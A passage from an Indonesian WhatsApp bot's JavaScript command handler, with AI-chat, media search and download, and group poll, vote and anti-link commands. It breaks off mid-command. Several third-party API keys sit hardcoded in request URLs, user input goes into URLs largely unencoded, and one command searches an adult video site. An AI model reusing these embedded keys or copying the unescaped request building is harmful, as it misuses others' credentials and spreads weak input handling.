await NanoBotz.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replynano("`*Error Kak :(*`")
}
}
break

case 'gpt4_2': {
if (!text) return replynano(`🍃 *Mau Nanya Apa Sama GPT4v2?*`)
replynano('*Tunggu sebentar 🗿☕*')
var NanoBotzai = await fetchJson(`https://widipe.com/v2/gpt4?text=${text}`)
 var lenai = NanoBotzai.result
await replynano(lenai)
}

    break
case 'realistic': case '3dmodel': {
    	if (!text) return reply(`*Example:* ${prefix + command} blue sky`)
await NanoBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
  try {
    let negative = 'jelek, cacat, berisik, buram, terdistorsi, tidak fokus, anatomi buruk, anggota tubuh tambahan, gambar wajah buruk, tangan tidak tergambar dengan baik, jari hilang, dewasa, telanjang, 18+';
    let gpt = await (await fetch(`https://itzpire.com/ai/${command}?prompt=${text}`)).json();
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `> ${command} AI\n\n_*hasil dari: ${text}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: gpt.result }}, { upload: NanoBotz.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Nice bosquu","id":".mangap"}`
            }],
          })
       })
    }
  }
}, { quoted: m })
await NanoBotz.relayMessage(m.chat, msgs.message, {})
  } catch(e) {
    return reply("`GPT Not Responding`")
  }
}
break
case 'indo-ai': {
	if (!text) return reply(`*• Example:* ${prefix + command} halo`)
await NanoBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
try {
let gpt = await (await fetch(`https://itzpire.com/ai/gpt-web?q=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Indo AI' + '\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image:  fs.readFileSync('./data/image/thumb.jpg')}, { upload: NanoBotz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Nice bosquu","id":".mangap"}`
            }],
          })
          
       })
    }
  }
}, { quoted: m })
await NanoBotz.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("`*Error*`")
}
}
break
case 'lepton': case 'leptonai': {
	if (!text) return replynano(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);   
await NanoBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Lepton AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./data/image/lepton.jpg')}, { upload: NanoBotz.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Nice Lepton Ai ✨","id":".mangap"}`
            }],
          }),
          
       })
    }
  }
}, { quoted: m })
await NanoBotz.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replynano("`*Error Kak :(*`")
}
}
break

case 'carimusik': {
if (!quoted) return replynano(`mana Musiknya kak?`)
const media = await NanoBotz.downloadAndSaveMediaMessage(quoted)
	let anuu = await TelegraPh (media)
	const crii = await fetchJson(`https://api.lolhuman.xyz/api/musicsearch?apikey=danzxnano&file=${anuu}`);
	reply(`Status: succes\n*Judul* : ${crii.result.title}\n*Album* : ${crii.result.album}\n`)
}
break
case 'film':
if (!text) return replynano(`contoh: .film cars`)
reply(mess.wait)
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title             : " + fids.data.Title + "\n"
            imdbt += "📅Year             : " + fids.data.Year + "\n"
            imdbt += "⭐Rated          : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime     : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre          : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director     : " + fids.data.Director + "\n"
            imdbt += "✍Writer         : " + fids.data.Writer + "\n"
            imdbt += "👨Actors        : " + fids.data.Actors + "\n"
            imdbt += "📃Plot              : " + fids.data.Plot + "\n"
            imdbt += "🌐Language     : " + fids.data.Language + "\n"
            imdbt += "🌍Country        : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards         : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice    : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production  : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes   : " + fids.data.imdbVotes + ""
           NanoBotz.sendMessage(m.chat, {
image: {
url: fids.data.Poster,
},
caption: imdbt,
            }, {
quoted: m,
            })
break
case 'xnxxsearch': {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replynano(`Enter Query`)
	reply(mess.wait)
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replynano(ff)
              }
              break
              case 'pin':
              case 'pinterest': {
    let input = "> _contoh: pin Marsha lenathea_";
    if (!text) return reply(input);
     reply('*Loading....*');
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: NanoBotz.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 10; i++) {
        const imageUrl = await pinterest(text);
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] // Hapus semua tombol
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `${text}\n> Batas 10 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'ringtone': {
		if (!text) return replynano(`Example : ${prefix + command} black rover`)
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		NanoBotz.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	
break
case 'cuaca':
case 'weather': {
    if (!text) {
        return replynano('Silakan masukkan nama kota yang ingin Anda cek cuacanya.');
    }

    try {
        let wdata = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&lang=id`
        );

        // Deskripsi lengkap cuaca
        const cuacaUtama = wdata.data.weather[0].main;
        const deskripsiCuaca = wdata.data.weather[0].description;
        const suhu = wdata.data.main.temp;
        const terasaSeperti = wdata.data.main.feels_like;
        const tekananUdara = wdata.data.main.pressure;
        const kelembaban = wdata.data.main.humidity;
        const kecepatanAngin = wdata.data.wind.speed;
        const lintang = wdata.data.coord.lat;
        const bujur = wdata.data.coord.lon;
        const negara = wdata.data.sys.country;

        // Menyusun pesan cuaca
        let textw = `*Informasi Cuaca untuk Kota ${text.charAt(0).toUpperCase() + text.slice(1)}*\n\n`;
        textw += `🌤️ *Cuaca Utama*        : ${cuacaUtama}\n`;
        textw += `📖 *Deskripsi*                : ${deskripsiCuaca}\n`;
        textw += `🌡️ *Suhu Rata-rata*    : ${suhu} °C\n`;
        textw += `🔥 *Terasa Seperti*     : ${terasaSeperti} °C\n`;
        textw += `🌬️ *Kecepatan Angin*: ${kecepatanAngin} Km/j\n`;
        textw += `💧 *Kelembaban*          : ${kelembaban}%\n`;
        textw += `🎈 *Tekanan Udara*     : ${tekananUdara} hPa\n\n`;
        textw += `📍 *Koordinat*       :\n`;
        textw += `   - Lintang : ${lintang}\n`;
        textw += `   - Bujur      : ${bujur}\n\n`;
        textw += `🏳️ *Negara*           : ${negara}\n`;

        // Mengirimkan pesan dengan format yang lebih menarik
        NanoBotz.sendMessage(
            m.chat, {
                text: textw,
            }, {
                quoted: m,
            }
        );
    } catch (error) {
        replynano('Maaf, terjadi kesalahan saat mengambil data cuaca. Pastikan nama kota yang Anda masukkan sudah benar.');
    }
}
break;

break
case 'spotify': case 'spotifysearch': case 'spotifys':  {
  if (!text) return reply('Masukan judul lagu!')
  let result = await searchSpotify(text)
      let caption = result.map((v, i) => {
          return {
                  header: "",
                  title: v.name,
                  description: `Link: ${v.link}`,
                  id: '.spdl ' + v.link
              }
          })
          let msg = generateWAMessageFromContent(m.chat, {
              viewOnceMessage: {
                  message: {
                      messageContextInfo: {
                          deviceListMetadata: {},
                          deviceListMetadataVersion: 2
                      },
                      interactiveMessage: {
                          body: {
                              text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List dibawah ini`,
                          },
                          footer: {
                              text: 'Bangsul-Bot'
                          },
                          header: {
                              title: "Spotify - Search",
                              subtitle: "",
                              hasMediaAttachment: false,
                          },
                          nativeFlowMessage: {
                              buttons: [
                                  {
                                      name: "single_select",
                                      buttonParamsJson: JSON.stringify({
                                          title: "CLICK HERE",
                                          sections: [
                                              {
                                                  title: "",
                                                  rows: caption
                                              }
                                          ]
                                      })
                                  }
                              ]
                          }
                      }
                  }
              }
          }, { quoted: m }, {});
          await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
              messageId: msg.key.id
          });
  }
  break
  break
  case 'mediafire': {
if (args.length == 0) return replynano(`Dimana linknya?`)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return replynano(`The link you provided is invalid`)
const { mediafireDl } = require('./lib/mediafire.js')
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 10000) return replynano('Oops, the file is too big...')
const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
replynano(`${result4}`)
NanoBotz.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
case 'google': {
if (!q) return replynano(`Example : ${prefix + command} ${botname}`)
reply(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
replynano(teks)
})
}
break
case 'happymod':{
if (!q) return replynano(`Example ${prefix+command} Subway surfer mod`)
reply(mess.wait)
let kat = await scp1.happymod(q)
replynano(util.format(kat))
}
break

case 'yts': case 'ytsearch': {
if (!text) return replynano(`Example : ${prefix + command} story wa anime`)
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`
}
NanoBotz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
        }
        break
break
case 'play': case 'songs': {
let yts = require("yt-search")
if(!text) return reply('> mau cari lagu apa kak')
await NanoBotz.sendMessage(m.chat, {
    react: {
        text: "🕒",
        key: m.key,
    }
})
let search = await yts(text);
let anup3k = search.videos[0];
let { title, thumbnail, timestamp, views, ago, url } = anup3k;
let searchResponse = await ytdlnew(url);
         let doc = {
audio: {
  url: searchResponse.mp3DownloadLink
},
mimetype: 'audio/mp4',
fileName: `${title}`,
contextInfo: {
  externalAdReply: {
    showAdAttribution: true,
    mediaType: 2,
    mediaUrl: url,
    title: title,
    sourceUrl: url,
    thumbnail: await (await NanoBotz.getFile(thumbnail)).data
  }
}
};
await NanoBotz.sendMessage(m.chat, doc, { quoted: m });
}
break

case 'tiktoksearch':
case 'carivideotiktok':
case 'ttsearch': {
  if (!text) return reply('_Mau cari apa kak_?\ncontoh: .tiktoksearch (link tiktok)');
  reply(mess.wait);
  try {
    const data = await fetchJson(`https://skizo.tech/api/tiktok-search?apikey=nanogembul&keywords=${encodeURIComponent(text)}`);
    const video = data[0]; // Assuming the first video in the search results is used
    if (!video) return reply('_Video tidak ditemukan_');
    const caption = `_⚡"Tiktok Search By ${botname}_\n\n*Judul:* ${video.title}\n*Region:* ${video.region}\n*Durasi:* ${video.duration} detik\n*Dibuat oleh:* ${video.music_info.author}\n*Jumlah Like:* ${video.digg_count}\n*Jumlah Komentar:* ${video.comment_count}\n*Jumlah Share:* ${video.share_count}\n*Jumlah Tonton:* ${video.play_count}`;

    const videoMessage = {
      video: { url: video.play },
      caption: caption,
      jpegThumbnail: await getBuffer(video.cover), // Assuming getBuffer is a function to fetch image buffer
      contextInfo: {
        externalAdReply: {
          title: video.title,
          body: `By ${video.music_info.author}`,
          mediaType: 2,
          thumbnail: await getBuffer(video.cover),
          mediaUrl: video.play,
          sourceUrl: video.play
        }
      }
    };

    await NanoBotz.sendMessage(m.chat, videoMessage, { quoted: m });
  } catch (error) {
    console.error(error);
    reply('_Maaf, terjadi kesalahan dalam melakukan pencarian TikTok_');
  }
}
break;
case 'terabox':
case 'teraboxdl': {
  if(!text) return reply('linknya mana kak')
reply(mess.wait)
  const response = await fetch(`https://api.alyachan.dev/api/terabox?url=${encodeURIComponent(text)}&apikey=manz.alien`);
const data = await response.json();
const downloadLink = data.data.url;
const caption = data.data.filename;
const responseHeaders = response.headers;
const mimeType = responseHeaders.get('content-type');
NanoBotz.sendMessage(m.chat, { document: { url: downloadLink, mimetype: mimeType }, fileName: caption }, { quoted: m });

}
break

















































//case grup
//=========================================\\======
break
case 'join': {
if (!DanzTheCreator) return reply(mess.only.owner)
if (!text) return replynano(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replynano('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await NanoBotz.groupAcceptInvite(result)
await replynano(`Done`)
}
break
case 'poll': {
	if (!DanzTheCreator) return reply(mess.only.owner)
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await replynano(
`Sebutkan pertanyaan dan minimal 2 pilihan\nContoh: ${prefix}poll Siapa admin terbaik?|agus, samsul, udin...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await NanoBotz.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break
        case 'vote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (m.chat in vote) return replynano(`_Masih ada suara di chat ini!_\n\n*${prefix}deletevote* - untuk menghapus suara`)
            if (!text) return replynano(`Masukkan Alasan Memilih, Contoh: *${prefix + command} Pemilik Tampan*`)
            replynano(`Pemungutan suara dimulai!\n\n*${prefix}upvote* - untuk upvote\n*${prefix}downvote* - untuk downvote\n*${prefix}checkvote* - untuk memeriksa suara\n*${prefix} deletevote* - untuk menghapus suara`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            NanoBotz.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replynano(`_*tidak ada voting di grup ini!*_\n\n*${prefix}vote* - untuk memulai voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replynano('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            NanoBotz.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
case 'downvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replynano(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replynano('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            NanoBotz.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
 
case 'checkvote':
if (!m.isGroup) return reply(mess.only.group)
if (!(m.chat in vote)) return replynano(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${NanoBotz.user.id}
`
NanoBotz.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case 'delvote': case 'hapusvote': {
            if (!m.isGroup) return reply(mess.only.group)
            if (!(m.chat in vote)) return replynano(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replynano('Successfully Deleted Vote Session In This Group')
	    }
            break

case 'resetlinkgc':
case 'resetlinkgroup':
case 'resetlinkgrup':
case 'revoke':
case 'resetlink':
case 'resetgrouplink':
case 'resetgclink':
case 'resetgruplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
NanoBotz.groupRevokeInvite(m.chat)
}

break
case 'antivirus': case 'antivirtex': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (antiVirtex) return replynano('Already activated')
ntvirtex.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replynano('Success in turning on antivirus in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiVirtex) return replynano('Already deactivated')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(ntvirtex))
replynano('Success in turning off antivirus this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363222395675670@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
  case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return replynano('Already activated')
ntilinkytvid.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replynano('Success in turning on youtube video antilink in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return replynano('Already deactivated')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
replynano('Success in turning off youtube video antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        })
      })
    }
  }
}, { quoted: m });

await NanoBotz.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !DanzTheCreator) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return replynano('Already activated')
ntilinkytch.push(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
replynano('Success in turning on youtube channel antilink in this group')
var groupe = await NanoBotz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
NanoBotz.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube channel link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return replynano('Already deactivated')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
replynano('Success in turning off youtube channel antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: botname
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: NanoBotz.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
